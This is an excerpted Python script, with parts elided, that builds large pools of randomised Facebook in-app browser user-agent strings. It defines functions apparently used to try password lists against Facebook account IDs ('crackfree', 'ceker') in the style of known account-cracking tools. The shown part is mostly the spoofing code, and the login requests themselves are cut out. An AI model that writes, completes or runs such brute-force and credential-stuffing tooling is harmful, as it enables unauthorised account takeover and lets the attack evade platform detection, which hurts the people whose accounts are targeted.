...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10; LM-G710'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/QKQ1.191222.002; wv)'
	...
	k='Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/230.0.0.36.117;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 12; LM-G900'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Build/SKQ1.211103.001; wv)'
	...
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 8.1.0; itel W6001'
	...
	i='Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]'
...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]'])
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 9; itel L6501 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/291.0.0.44.120;]'
